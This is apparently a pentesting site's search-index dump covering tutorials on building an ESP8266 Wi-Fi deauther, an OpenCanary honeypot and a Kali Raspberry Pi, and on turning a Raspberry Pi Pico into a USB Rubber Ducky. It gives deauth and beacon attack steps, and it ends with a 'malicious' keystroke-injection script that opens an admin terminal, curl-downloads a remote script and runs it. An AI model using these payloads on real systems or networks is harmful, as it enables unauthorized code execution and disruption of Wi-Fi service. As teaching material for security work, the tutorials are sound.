</ul>"},{"location":"Pentesting/Physical/NodeMCU%20ESP8266/Wi-Fi%20Deauther/#how-make-your-own-wi-fi-deauther-using-nodemcu-esp8266-using-arduino-ide","title":"How make your own Wi-Fi deauther using nodemcu (esp8266) using Arduino IDE","text":"<p>Step 1: Download the Arduino IDE from here</p> <p></p> <p>Click on \u201cJust download\u201d.</p> <p></p> <p>Step 2: Install the IDE just like normal software.</p> <p></p> <p>Let it run it\u2019s initial setup</p> <p></p> <p></p> <p>Give admin privileges if needed.</p> <p>Step 3: When it get complete go to file \u2192 Preferences.</p> <p></p> <p>Step 4: Scroll down and add http://arduino.esp8266.com/stable/package_esp8266com_index.json in \u201cAdditional boards manager URLs\u201d.</p> <p></p> <p>It will update it\u2019s board manager list</p> <p></p> <p>Step 5: Then go to boards manager(second button at left sidebar) and search for \u201cesp8266\u201d.</p> <p></p> <p>Step 6: Install the driver for esp8266.</p> <p></p> <p>Step 7: Then go to Tools \u2192 Board \u2192 esp8266 \u2192 generic esp866 module. This will set our board for us.</p> <p></p> <p>Step 8: The download the latest version of deauther from the github repository. Download the zip.</p> <p></p> <p>Step 9: Extract the zip and open the esp8266_deauther folder.</p> <p></p> <p>Step 10: Open the <code>esp8266_deauther.ino</code> file in Arduino IDE.</p> <p></p> <p>Make sure you already select the correct board.</p> <p></p> <p>Step 11: Compile the code</p> <p></p> <p>Step 12: After compilation select the board port in Tools \u2192 port.</p> <p></p> <p>Step 13: Then upload the code</p> <p></p> <p>Let the upload complete</p> <p></p> <p>Step 14: You will see an Wi-Fi access point name \u201cpwned\u201d</p> <p></p> <p>Step 15: Just connect with it with default password \u201cdeauther\u201d.</p> <p></p> <p>Step 16: Open the browser and type \u201c192.168.4.1\u201d and press enter you will see the following warning page about deauther</p> <p></p> <p>Step 17: Now you will see the \u201cScan\u201d page of deauther which will showcase nearby Wi-Fi access points.</p> <p></p> <p>Here you have 3 options:</p> <ul> <li>17.1 Scan</li> <li>17.2 SSIDs</li> <li>17.3 Attack</li> </ul> <p>Lets see one by one.</p> <p>17.1 Scan:</p> <pre><code>In this you will be able to see the nearby Wi-Fi access points and there MAC address, strength, encryption type, option to scan access points, option to scan stations, vendor, option to add and remove.\n\nYou can add and remove the access points in order add or remove them from the scope of attack.\n</code></pre> <p></p> <p>17.2 SSIDs:</p> <p>Here you can add the dummy SSIDs for beacon attack.</p> <p></p> <p>17.3 Attack:</p> <p>Here you choose which type of attack you want to do.</p> <p></p> <p>There are 3 type of attack:</p> <ul> <li> <p>Deauth: This will send multiple deauth packets on the Wi-Fi access point which will disconnect all the devices connected to Wi-Fi until it\u2019s stopped.</p> </li> <li> <p>Beacon: This will generate multiple fake Wi-Fi access points by SSIDs which you given in SSIDs page. Anybody can not connect to those Wi-Fi access points but it is useful to trick the devices that they are connecting to legitimate Wi-Fi access point.</p> </li> <li> <p>Probe: This will send multiple probe requests to nearby Wi-Fi access points. Probe request are generally send to share SSID with nearby Wi-Fi access point.</p> </li> </ul> <p>Tip: More information about attacks is given on the page itself at bottom.</p>"},{"location":"Pentesting/Physical/NodeMCU%20ESP8266/Wi-Fi%20Deauther/#summary","title":"Summary","text":"<p>We explored the world of Wi-Fi deauther tools, beginning with an explanation of what they are and why they're used, including potential malicious purposes. It also distinguishes Wi-Fi deauthers from Wi-Fi jammers, highlighting their respective functions. Moreover, it provides practical instructions on creating a Wi-Fi deauther using NodeMCU (ESP8266) while underscoring the importance of responsible and ethical usage for network testing and security assessment.</p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/honeypot-using-raspberry-pi-and-opencanary./","title":"Honeypot using Raspberry Pi &amp; Opencanary","text":""},{"location":"Pentesting/Physical/Raspberry%20Pi/honeypot-using-raspberry-pi-and-opencanary./#honeypot-using-raspberry-pi-opencanary","title":"Honeypot using Raspberry Pi &amp; Opencanary","text":""},{"location":"Pentesting/Physical/Raspberry%20Pi/honeypot-using-raspberry-pi-and-opencanary./#what-is-honeypot-opencanary","title":"What is honeypot &amp; opencanary?","text":"<p>Honeypot</p> <p>A honeypot is a security mechanism designed to deceive and detect unauthorized access or attacks on a network by simulating vulnerable systems or services. The primary purpose of a honeypot is to attract and trap attackers, allowing security professionals to study their tactics, techniques, and procedures (TTPs), as well as gather threat intelligence. Honeypots come in various forms, ranging from low-interaction honeypots, which simulate certain services without real system involvement, to high-interaction honeypots that emulate complete systems.</p> <p>OpenCanary</p> <p>OpenCanary is an open-source honeypot framework that simplifies the deployment and configuration of honeypots. It is designed to mimic various services and protocols to attract potential attackers and log their activities. OpenCanary is written in Python and is customizable, allowing users to define the services they want to emulate and the types of events they want to log. It is widely used for research, threat detection, and gaining insights into the tactics used by attackers.</p> <p>Key features of OpenCanary include:</p> <ol> <li>Customizable Services: OpenCanary allows users to emulate a variety of services, such as SSH, HTTP, SMB, and more. Users can configure which services to run based on their specific needs.</li> <li>Logging and Alerting: The framework logs various events and interactions, helping users analyze the behavior of potential attackers. It also supports alerting mechanisms, such as email notifications, to notify administrators of suspicious activities.</li> <li>Integration with SIEM Systems: OpenCanary can be integrated with Security Information and Event Management (SIEM) systems, allowing for centralized monitoring and analysis of honeypot data.</li> <li>Diverse Deployment Options: OpenCanary can be deployed on different platforms, including Raspberry Pi, making it accessible and cost-effective for various users.</li> <li>Community Support: Being open-source, OpenCanary benefits from a community of users and contributors who actively contribute to its development and share insights on threat intelligence.</li> </ol>"},{"location":"Pentesting/Physical/Raspberry%20Pi/honeypot-using-raspberry-pi-and-opencanary./#why-companies-use-honeypot","title":"Why companies use honeypot?","text":"<p>Companies use honeypots as a cybersecurity strategy to lure and trap cyber attackers, acting as decoys that mimic real systems, networks, or data. Honeypots are designed to be attractive targets, deliberately containing vulnerabilities to attract hackers. When attackers interact with a honeypot, their techniques, tools, and behaviors can be monitored and analyzed without risking actual data or systems. This intelligence allows companies to better understand potential threats, improve their defenses, and sometimes even identify the attackers. By acting as early warning systems, honeypots help companies preemptively bolster their security measures, making them an essential component in a comprehensive cybersecurity strategy. Here are some key reasons why companies deploy honeypots:</p> <ul> <li>Early Threat Detection</li> <li>Understanding Attack Techniques</li> <li>Threat Intelligence Gathering</li> <li>Incident Response Preparation</li> <li>Evaluation of Security Posture</li> <li>Security Awareness and Training</li> <li>Research and Collaboration</li> <li>Strategic Deception</li> <li>Legal and Ethical Deterrent</li> <li>Compliance Requirements</li> </ul>"},{"location":"Pentesting/Physical/Raspberry%20Pi/honeypot-using-raspberry-pi-and-opencanary./#setting-up-raspberry-pi-as-opencanary-honeypot","title":"Setting up Raspberry Pi as opencanary honeypot","text":"<ol> <li>Setup Raspberry Pi.</li> <li>Install &amp; configure Opencanary on Raspberry Pi.</li> <li>Configure auto start opencanary on boot.</li> </ol>"},{"location":"Pentesting/Physical/Raspberry%20Pi/honeypot-using-raspberry-pi-and-opencanary./#setup-raspberry-pi","title":"Setup Raspberry Pi","text":"<p>Before setting up the Raspberry Pi. Below is the list of tools we need in order to setup.</p> <ol> <li>Raspberry Pi 4 ( 4 or higher is recommended but 3/3b will also work)</li> <li>Raspberry Pi power supply</li> <li>Micro SD card (16 GB or higher)</li> <li>Ethernet cable (optional)</li> </ol> <p>After gathering all the required tool we can setup the raspberry pi for opencanary. Below are the step-by-step instructions to set up a Raspberry Pi for OpenCanary:</p> <p>Step 1: Go to the official Raspberry Pi website and download the \u201cRaspberry Pi Imager\u201d tool according to your OS.</p> <p></p> <p>Step 2: Install the raspberry pi Imager as normal software we install usually.</p> <p></p> <p>Step 3: Open the Imager and give the administrative privileges and select raspberry pi board according to your raspberry pi version.</p> <p></p> <p>Step 4: Next choose the OS Raspberry Pi OS Lite (64 bit).</p> <p></p> <p>Note We are using Lite version means only CLI is available. If you want to access it through GUI use Full or normal 64 bit version. But you will need monitor, keyboard, mouse &amp; connectors to access and use GUI.</p> <p>Step 5: Now insert the micro-SD card into your computer/laptop. Then select the choose storage and select your SD card properly.</p> <p></p> <p>Step 6: After that it will ask for \u201cWould you like to apply OS customization settings?\u201d click on edit settings.</p> <p></p> <p>Step 7: Enable the following options as shown in the picture and set the following things    1. Username &amp; password.    2. Wi-Fi name(SSID) &amp; password.    3. Time zone &amp; keyboard layout.</p> <p></p> <p>Now go to service tab, enable ssh and turn on \u201cUse password authentication\u201d option on as follows:</p> <p></p> <p>All the data on the micro SD card will be erased. So select the SD card carefully and take backup of micro SD card before proceeding</p> <p>After that click on \u201cYes\u201d on warning.</p> <p></p> <p>let it complete the flash. (could take 5-10 min depending on SD card read/write speed).</p> <p>Step 8:  After that insert the SD card in raspberry pi and boot (start) it. If you have monitor and keyboard setup the boot and open the terminal. And if you are following the steps given then search for IP address of raspberry pi in network through any network scanner or open the router dashboard and get the IP address of raspberry pi from there and run the following command to connect to it with command line.</p> <pre><code>`ssh username@ip_address`\n\nHere username is which you given already before flashing SD card and IP address of raspberry pi.\n</code></pre> <p></p> <p>If you are connecting for first time it will ask for \u201ccontinue connecting?\u201d then type <code>yes</code> and hit enter and enter the <code>password</code> you set in the previous step.</p> <p>Note If you didn\u2019t set any password then the default username is <code>pi</code> and password is <code>raspberry</code>.</p> <p>Step 9:  Then execute the following command to update &amp; upgrade system.</p> <p><code>sudo apt update &amp;&amp; sudo apt upgrade -y</code></p> <p></p> <p>This will update all the packages to their latest version.</p> <p>Step 10: Execute the following command to install required packages for opencanary.</p> <p><code>sudo apt install python3-dev python3-pip python3-virtualenv python3-venv python3-scapy libssl-dev libpcap-dev</code></p> <p></p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/honeypot-using-raspberry-pi-and-opencanary./#install-configure-opencanary-on-raspberry-pi","title":"Install &amp; configure Opencanary on Raspberry Pi","text":"<p>Step 1:  Execute the following command to install opencanary.</p> <p><code>virtualenv env/</code></p> <p><code>. env/bin/activate</code></p> <p><code>pip install opencanary</code></p> <p></p> <p>After that execute the following command to create a configuration file of opencanary</p> <p><code>opencanaryd --confing</code></p> <p></p> <p>This will create a file name opencanary.conf in the /etc/opencanaryd/ directory.</p> <p>Step 2:  Now execute following command to edit that configuration file.</p> <p><code>sudo nano /etc/opencanaryd/opencanary.conf</code></p> <p></p> <p>The command will open the file in nano text editor. Here you can configure the honeypot configuration like what services should be on, on what port should they run etc.</p> <p></p> <p>Step 3: Here set <code>\u201chttp.enabled\u201d : true</code> to set fake http server on. Now press CTRL + S to save &amp; CTRL + X to exit from nano.</p> <p></p> <p>Step 4: Now we need to setup your mail in order to get alerts on email. Add the following lines in the configuration file \u201chandlers\u201d section as follows:</p> <pre><code>\"SMTP\": {\n\"class\": \"logging.handlers.SMTPHandler\",\n\"mailhost\": [\"smtp.gmail.com\", 587],\n\"fromaddr\": \"noreply@yourdomain.com\",\n\"toaddrs\" : [\"youraddress@gmail.com\"],\n\"subject\" : \"OpenCanary Alert\",\n\"credentials\" : [\"youraddress\", \"app password\"],\n\"secure\" : []\n},\n</code></pre> <p></p> <p>Note Create a new sperate gmail for raspberry pi opencanary. As this is risky to set an main gmail as opencanary alert gmail. Because if attacker compromised the honeypot they can get access to your gmail.</p> <p>Replace the following data before saving configuration:</p> <ol> <li>\u201cfromaddr\u201d : set to your opencanary gmail.</li> <li>\u201ctoaddrs\u201d : set to gmail on which you want to receive alerts.</li> <li>\u201ccredentials\u201d : [ \u201cfromaddr\u201d, \u201capp password\u201c]</li> </ol> <p>here are the steps to get app password.</p> <p>Note If you see the following error message while starting opencanary. Just open configuration file again and check if there is brackets or commas are missing and add them if missing.</p> <p></p> <p>Step 5:  After this we will start our opencanary setup by using following command:</p> <p><code>opencanaryd --start</code></p> <p></p> <p>We can see in the log which services are started. To test it is working or not, try login through FTP with random username &amp; password and see if you get alerts on your gmail with username &amp; password.</p> <p>Step 6: Now test opencanary by trying to login through FTP with fake username and password. Opencanary will automatically send alerts on your gmail as follows:</p> <p></p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/honeypot-using-raspberry-pi-and-opencanary./#configure-auto-start-opencanary-on-boot","title":"Configure auto start opencanary on boot","text":"<p>Step 1: Create a file using nano in <code>/etc/systemd/system</code> directory as following command and paste the data in it.</p> <p><code>sudo nano /etc/systemd/system/opencanary.service</code></p> <pre><code>Description=OpenCanary honeypot\nAfter=syslog.target\nAfter=network.target\n\n[Service]\nUser=pi\nRestart=no\nType=oneshot\nRemainAfterExit=yes\nEnvironment=VIRTUAL_ENV=/home/pi/env/\nEnvironment=PATH=$VIRTUAL_ENV/bin:/usr/bin:$PATH\nWorkingDirectory=/home/pi/env/bin\nExecStart=/home/pi/env/bin/opencanaryd --start\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p></p> <p>Now press CTRL + S to save &amp; CTRL + X to exit from nano.</p> <p>Note: If you want services like ssh, smb, etc. to be running fake then set the <code>User=root</code> to get the alerts on gmail or else it will not send any alerts regarding those services.</p> <p>Step 2: After saving file execute the following command to enable service on system boot &amp; start the service to test.</p> <p>1. To enable service.</p> <p><code>sudo systemctl enable opencanary.service</code></p> <p>To check it is enabled or not execute the following command:</p> <p><code>sudo systemctl is-enabled opencanary.service</code></p> <p></p> <p>2. To start the service.</p> <p><code>sudo systemctl start opencanary.service</code></p> <p>To check it is started or not execute the following command:</p> <p><code>sudo systemctl status opencanary.service</code></p> <p></p> <p>3. Now reboot the raspberry pi by using the command sudo reboot . And test the services which you started on opencanary by sending random inputs and see if you get alerts on gmail or not.</p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/honeypot-using-raspberry-pi-and-opencanary./#summary","title":"Summary","text":"<p>In conclusion, using a Raspberry Pi as a honeypot with OpenCanary offers an economical and flexible solution for enhancing cybersecurity defenses. By emulating various services and attracting potential attackers, this setup provides early threat detection, valuable insights into attack techniques, and contributes to collaborative threat intelligence. The straightforward installation process, coupled with the versatility of Raspberry Pi, makes this approach accessible for both enthusiasts and small businesses. Monitoring OpenCanary logs allows users to gain a deeper understanding of the evolving threat landscape, while ethical deployment and compliance with legal considerations ensure responsible cybersecurity practices. Ultimately, deploying a Raspberry Pi as a honeypot using OpenCanary is an educational and effective strategy for bolstering overall security posture.</p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/","title":"Portable Hacking Machine","text":""},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#portable-hacking-machine","title":"Portable Hacking Machine","text":""},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#what-is-portable-hacking-machine","title":"What is portable hacking machine ?","text":"<p>A portable hacking machine is a small computer, such as a Raspberry Pi, loaded with various hacking tools and software. It allows hackers and pentesters to quickly set up a secure testing environment and execute various security tests. Portable hacking machines are particularly useful for situations where a traditional desktop or laptop computer may not be practical or available, such as in remote locations with limited internet connectivity. These machines are also useful for maintaining anonymity as it is more difficult to trace the source of an attack. However, one disadvantage of using a portable hacking machine is limited processing power and storage capacity. Despite some limitations, a portable hacking machine is an essential tool for hackers and pentesters who need to perform security testing on the go.</p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#why-hackerspentesters-use-portable-hacking-machine","title":"Why hackers/pentesters use portable hacking machine?","text":"<p>Hackers and pentesters use portable hacking machines to conduct security testing on computer systems while on the move. This is especially useful when they need to perform security tests in remote locations, such as in areas where internet connectivity is limited. A portable hacking machine typically consists of a small computer, such as a Raspberry Pi, loaded with various hacking tools and software. It allows hackers and pentesters to quickly set up a secure testing environment and execute various security tests.</p> <p>Hackers and penetration testers use portable hacking machines for several reasons:</p> <ol> <li>Mobility: Portable hacking machines, often built on devices like Raspberry Pi or laptops, allow hackers and pentesters to carry out their work on the go. They can easily move from one location to another, making it convenient for field testing or engagements that require physical presence.</li> <li>Stealth and Anonymity: Portable machines can be small and inconspicuous, which makes it easier to blend into different environments. This level of stealth can be useful for conducting security assessments without attracting unnecessary attention.</li> <li>Remote Access: Portable hacking machines can be set up to establish remote access to target networks or systems. This enables hackers and pentesters to launch attacks and assessments from a safe location, reducing the risk of detection or physical compromise.</li> <li>Hardware Customization: Building a portable hacking machine allows for hardware customization. Users can select specific components and configurations tailored to their needs, such as wireless adapters for Wi-Fi hacking or additional storage for data collection.</li> <li>Dedicated Purpose: A portable hacking machine can be dedicated solely to security testing and offensive operations, reducing the risk of exposing personal or critical systems to potential threats.</li> <li>Quick Deployment: Having a pre-configured, portable machine ready to go can save time when responding to security incidents or conducting time-sensitive assessments. It eliminates the need to set up an environment from scratch each time.</li> <li>Separation from Personal Systems: Keeping hacking activities on a separate, isolated device helps protect personal or corporate systems from potential compromise and legal issues.</li> <li>Legal and Ethical Considerations: Ethical hackers and penetration testers must operate within legal and ethical boundaries. Using a designated portable hacking machine helps maintain a clear separation between legitimate security assessments and illegal activities.</li> </ol>"},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#creating-your-own-portable-hacking-machine-using-raspberry-pi","title":"Creating your own portable hacking machine using Raspberry Pi","text":""},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#what-youll-need","title":"What you'll need","text":"<ol> <li>Raspberry Pi (compatible models include Raspberry Pi 4, 3, 2, and Zero).</li> <li>MicroSD card (16GB or larger is recommended).</li> <li>MicroSD card reader.</li> <li>Ethernet cable.</li> <li>Power supply for the Raspberry Pi.</li> <li>HDMI cable and display (for initial setup).</li> <li>USB keyboard and mouse (for initial setup).</li> </ol>"},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#procedure","title":"Procedure","text":"<p>Download Kali Linux Image:</p> <ul> <li>Visit the official Kali Linux downloads page (https://www.kali.org/get-kali/#kali-arm) and select the appropriate image for your Raspberry Pi model. Download the image file (usually in .img.gz format).</li> </ul> <p>Note: In this example I will download raspberry pi (64-bit) image. Why 64-bit image because some tools might not work in 32-bit properly as _BurpSuite. S_o I will be using 64-bit image in this example.</p> <p></p> <p>Download balenaEtcher:</p> <p>Use Etcher (https://etcher.balena.io/) to write the Kali Linux image to the MicroSD card. Select the image you downloaded and the MicroSD card as the target.</p> <p></p> <p>Note: I am using balenaEtcher but you can also use raspberry pi imager or rufus in order to flash image to micro SD card.</p> <p>Flashing image:</p> <p>1. Open Etcher</p> <p></p> <p>2. Click on \u201cFlash from file\u201d and select the kali linux image you downloaded previously.</p> <p></p> <p>3. Connect your SD card to your system then click on \u201cSelect target\u201d and select you micro SD card carefully.</p> <p>Note: All the data in your SD card will be erased so please take the backup of SD card already.</p> <p></p> <p>It will give warning if you are using micro SD card higher than 64 GB. Click on \u201cYes, I\u2019m Sure\u201d.</p> <p></p> <p>4. Then click on \u201cFlash\u201d and sit back relax until it completes the flashing of image to you SD card. Time depends on SD card write speed.</p> <p></p> <p>Tip: Use high speed SD card to get high flash speed and high system performs on raspberry pi.</p> <p>It will also validate the flash so let that happen or you can skip it by clicking on \u201cskip\u201d.</p> <p></p> <p>5. After it done flashing quite the balenaEtcher and remove your micro SD card from system.</p> <p></p> <p>From here you have two ways:</p> <ol> <li>Connect raspberry pi monitory, mouse and keyboard and start using it.</li> <li>You can connect it to only ethernet cable and power supply and access it remotely.</li> </ol> <p>As this article is about portable hacking machine so I will do it using second way. Don\u2019t worry you will not always need to connect it to ethernet to work. Once you connect raspberry pi to ethernet then we will connect it to a wireless access point to control it wirelessly as given above.</p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#find-the-raspberry-pi-in-network","title":"Find the raspberry pi in network","text":"<p>You can do this by various tools like advanced IP scanner for windows or use nmap/netdiscover in linux or macOS.</p> <p>I will suggest the simple way. Just go to your router dashboard and see the connected devices and get the IP.</p> <p></p> <p>As you see I got mine easily.</p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#connect-to-raspberry-pi-using-ssh","title":"Connect to raspberry pi using SSH","text":"<p>Open the windows terminal and type \u201cssh kali@raspberry_pi-ip\u201d and hit enter.</p> <p></p> <p>Type \u201cyes\u201d and enter.</p> <p></p> <p>Now you will need to enter the password. The default password is \u201c**kal**i\u201d and hit enter.</p> <p></p> <p>Then first update and upgrade your machine by using the command \u201csudo apt update &amp;&amp; sudo apt upgrade -y\u201d</p> <p></p> <p>After that run command \u201csudo kalipi-config\u201d. A window will open.</p> <p></p> <p>Then select \u201cNetwork Options \u2192 Wi-Fi\u201d It will show nearby Wi-Fi access points.(You can navigate using arrow keys in it)</p> <p></p> <p>Then hit enter. Then you will need to enter SSID (Wi-Fi name) and then password to connect that Wi-Fi.</p> <p>Then you will be back to main window. Then navigate to \u201cfinish\u201d by using arrow keys and hit enter.</p> <p></p> <p>You will be connected to Wi-Fi. Now next time you don\u2019t need to connect ethernet cable to raspberry pi it will automatically connected to your Wi-Fi.</p> <p>Finally we are done with setting up raspberry pi portable hacking machine.</p> <p>Note: Don\u2019t forget to change the default the password of your user. You can change it by running command \u201cpasswd\" then enter old password and then new password (you might not see the password while typing for security reasons).</p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#pros-and-cons-of-portable-hacking-machine","title":"Pros and cons of portable hacking machine","text":"<p>Pros:</p> <ol> <li>Mobility: Portable hacking machines, often built on compact platforms like Raspberry Pi, offer mobility and flexibility for conducting security assessments in diverse environments.</li> <li>Customization: Users can tailor portable hacking machines to their specific needs, selecting hardware components and software tools to suit their ethical hacking objectives.</li> <li>Isolation: Keeping hacking activities on a dedicated, isolated device helps protect personal or critical systems from potential compromise.Quick</li> <li>Deployment: Pre-configured portable machines can save time during incident response or time-sensitive security assessments, eliminating the need to set up an environment from scratch.</li> <li>Legal and Ethical Boundary: A portable hacking machine can be used to reinforce the importance of conducting ethical hacking within legal and ethical boundaries.</li> </ol> <p>Cons:</p> <ol> <li>Legal and Ethical Concerns: Misuse of portable hacking machines can lead to legal consequences and ethical dilemmas if used for unauthorized and malicious purposes.</li> <li>Complexity: Setting up and configuring a portable hacking machine can be complex, requiring technical expertise and knowledge of ethical hacking tools.</li> <li>Cost: Building a capable portable hacking machine with advanced hardware components can be expensive, especially when considering additional accessories and tools.</li> <li>Risk of Detection: Even discreet devices are not entirely immune to detection, and if discovered, they could lead to suspicion or security alerts.</li> <li>Maintenance: Portable hacking machines may require ongoing maintenance and updates to ensure that tools and software remain current and effective.</li> </ol>"},{"location":"Pentesting/Physical/Raspberry%20Pi/portable-hacking-machine/#summary","title":"Summary","text":"<p>In summary, we explored the world of portable hacking machines, which are small, versatile devices like Raspberry Pi used by ethical hackers to test and improve computer security. These devices have the advantage of being portable, allowing testers to move around easily. They can be customized to fit specific needs and save time during security checks. However, misusing them can lead to legal and ethical issues, and setting them up can be complicated and costly. It's crucial to use these tools responsibly, following the law and ethical guidelines, to ensure they do more good than harm in the world of cybersecurity.</p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/usb-rubber-ducky-using-raspberry-pi-pico/","title":"USB Rubber Ducky using Raspberry PI Pico","text":""},{"location":"Pentesting/Physical/Raspberry%20Pi/usb-rubber-ducky-using-raspberry-pi-pico/#usb-rubber-ducky-using-raspberry-pi-pico","title":"USB Rubber Ducky using Raspberry PI Pico","text":""},{"location":"Pentesting/Physical/Raspberry%20Pi/usb-rubber-ducky-using-raspberry-pi-pico/#what-is-raspberry-pi-pico","title":"What is Raspberry PI Pico?","text":"<p>The Raspberry Pi Pico is a microcontroller board developed by the Raspberry Pi Foundation, known for its popular line of single-board computers (SBCs) like the Raspberry Pi 4. The Raspberry Pi Pico was introduced in January 2021 and is designed to provide an affordable and accessible platform for embedded systems, electronics projects, and learning about microcontrollers.</p> <p></p> <p>Key features and specifications of the Raspberry Pi Pico include:</p> <ol> <li>Microcontroller: The Pico is powered by the RP2040 microcontroller chip, which was also designed by the Raspberry Pi Foundation. The RP2040 is built around a dual-core ARM Cortex-M0+ processor and provides various I/O capabilities for interfacing with sensors, displays, and other hardware components.</li> <li>Memory: It has 264KB of SRAM, which is used for program execution and data storage.</li> <li>GPIO Pins: The board features 26 general-purpose input/output (GPIO) pins, which can be used for digital input and output, analog-to-digital conversion, PWM (Pulse Width Modulation), and more.</li> <li>Power Supply: It can be powered via a micro USB port or an external power supply (3.3V to 5V).</li> <li>Connectivity: While the Raspberry Pi Pico itself doesn't have built-in wireless connectivity like Wi-Fi or Bluetooth, you can add these capabilities through external modules or shields.</li> <li>Programming: The Pico can be programmed using MicroPython, CircuitPython, C/C++, and other programming languages. It's compatible with popular development environments like Thonny, Visual Studio Code, and PlatformIO.</li> <li>Cost: One of the notable aspects of the Raspberry Pi Pico is its low cost, making it an attractive option for educational institutions and hobbyists.</li> </ol> <p>The Raspberry Pi Pico is suitable for a wide range of applications, including robotics, home automation, sensor-based projects, and IoT (Internet of Things) devices. It has gained popularity for its ease of use, extensive documentation, and the support of the Raspberry Pi community.</p> <p>Overall, the Raspberry Pi Pico is a versatile microcontroller board that provides an excellent platform for learning about embedded systems and developing various electronic projects.</p>"},{"location":"Pentesting/Physical/Raspberry%20Pi/usb-rubber-ducky-using-raspberry-pi-pico/#why-hackers-use-raspberry-pi-pico","title":"Why hackers use Raspberry PI Pico?","text":"<ol> <li>Penetration Testing and Security Research: Ethical hackers, security researchers, and penetration testers may use Raspberry Pi Pico to assess the security of computer systems, networks, and IoT devices. They can use it to identify vulnerabilities and weaknesses in systems and report them to the owners for mitigation.</li> <li>Exploiting Vulnerabilities: Malicious hackers may use a Raspberry Pi Pico to exploit vulnerabilities in systems and gain unauthorized access. They can use the board to automate and script attacks, such as brute-force password cracking or launching malware.</li> <li>Physical Attacks: Raspberry Pi Pico can be used in physical attacks where attackers gain physical access to a target system. For example, an attacker could use it to emulate a keyboard and inject malicious commands into a victim's computer when plugged into a USB port.</li> <li>IoT Device Compromises: IoT devices are sometimes vulnerable to attacks. Hackers may use Raspberry Pi Pico to reverse engineer and compromise IoT devices, potentially using them as part of a botnet or for other malicious purposes.</li> <li>Data Exfiltration: In some cases, attackers may use the board to exfiltrate sensitive data from compromised systems. They can program it to act as a data exfiltration tool, sending stolen information to a remote server.</li> <li>Network Attacks: Raspberry Pi Pico can be used as a network tool to intercept or manipulate network traffic. For example, it could be programmed to act as a rogue access point, allowing attackers to perform man-in-the-middle attacks.</li> <li>Educational and Skill Development: It's worth noting that some individuals with a strong interest in technology may initially experiment with Raspberry Pi Pico for legitimate educational purposes but may later misuse their knowledge and skills for malicious activities.</li> </ol>"},{"location":"Pentesting/Physical/Raspberry%20Pi/usb-rubber-ducky-using-raspberry-pi-pico/#how-make-usb-rubbery-ducky-using-raspberry-pi-pico","title":"How make USB Rubbery ducky using Raspberry PI pico","text":""},{"location":"Pentesting/Physical/Raspberry%20Pi/usb-rubber-ducky-using-raspberry-pi-pico/#requirements","title":"Requirements","text":"<ol> <li>Raspberry Pi Pico</li> <li>Micro USB cable</li> <li>Any Text editor like Sublime/Notepad.</li> </ol>"},{"location":"Pentesting/Physical/Raspberry%20Pi/usb-rubber-ducky-using-raspberry-pi-pico/#setup","title":"Setup","text":"<p>1. First download the circuit python for your pico from here.</p> <p></p> <p>Note:- If you are using pico w then download this it from here.</p> <p>2. Connect your pico to system.</p> <p></p> <p>3. Now copy paste the  <code>.uf2</code> circuit python file to pico. It will disconnect pico and automatically and connect it back to system automatically.</p> <p></p> <p>4. Now download the latest release of <code>adafruit-circuitpython-bundle-8.x-mpy-YYYYMMDD.zip</code> from here and extract it on your system.</p> <p></p> <p>5. Navigate to <code>lib</code> folder and copy the <code>adafruit_hid</code> folder to the pico.</p> <p></p> <p>6. Now copy the following files and folder from <code>adafruit_hid/lib</code> to <code>lib</code> folder of pico.    1. <code>adafruit_debouncer.mpy</code>    2. <code>adafruit_tricks.mpy</code>    3. <code>addafruit_wsgi</code>    4. <code>asyncio</code></p> <p></p> <p>7. Now download the <code>pico-ducky.zip</code> from github repository and extract it.</p> <p></p> <p>8.  Now copy the following files from the pico-ducky folder to pico drive.</p> <ol> <li><code>boot.py</code></li> <li><code>duckyinpython.py</code></li> <li><code>code.py</code></li> <li><code>webapp.py</code></li> <li><code>wsgiserver.py</code></li> </ol> <p>From:</p> <p></p> <p>To:</p> <p></p> <p>9. Now open any text editor you like and copy paste the following ducky script. for testing the pico-ducky only.</p> <p>Script:</p> <p><code>GUI r</code></p> <p><code>DELAY 1000</code></p> <p><code>STRING notepad.exe</code></p> <p><code>ENTER</code></p> <p><code>DELAY 1000</code></p> <p><code>STRING Hello World!</code></p> <p></p> <p>And save it as <code>payload.dd</code> in pico drive.</p> <p>Now disconnect and reconnect the pico to test if it is working or not. If it is working it will open notepad and type <code>Hello World!</code> in it.</p> <p>10. Now you can write your own ducky script inside the <code>payload.dd</code> file and run it on any system.</p> <p>Note: - After saving the ducky script in payload.dd it will execute it immediately on connected system. So keep that in mind before writing the ducky script.</p> <p><code>Hello World!</code> Demo:</p> <p>https://vimeo.com/870229586?share=copy</p> <p>Example malicious ducky script:</p> <p>https://vimeo.com/870230398?share=copy</p> <p>Script:</p> <p><code>REM TO CLOSE OPENED FILE EXPLORER WE USE ALT F4</code></p> <p><code>ALT F4</code></p> <p><code>DELAY 500</code></p> <p><code>GUI r</code></p> <p><code>DELAY 500</code></p> <p><code>STRING wt</code></p> <p><code>REM TO OPEN AS ADMINISTRATOR USING CONTROL SHIFT ENTER</code></p> <p><code>CONTROL SHIFT ENTER</code></p> <p><code>DELAY 1000</code></p> <p><code>LEFT</code></p> <p><code>DELAY 500</code></p> <p><code>ENTER</code></p> <p><code>DELAY 1000</code></p> <p><code>STRING cd .\\Downloads\\</code></p> <p><code>ENTER</code></p> <p><code>DELAY 500</code></p> <p><code>STRING curl URL/to/your/powershell/script -O script.ps1</code></p> <p><code>ENTER</code></p> <p><code>DELAY 500</code></p> <p><code>STRING .\\script.vbs</code></p> <p><code>ENTER</code></p> <p><code>DELAY 500</code></p> <p><code>STRING exit</code></p> 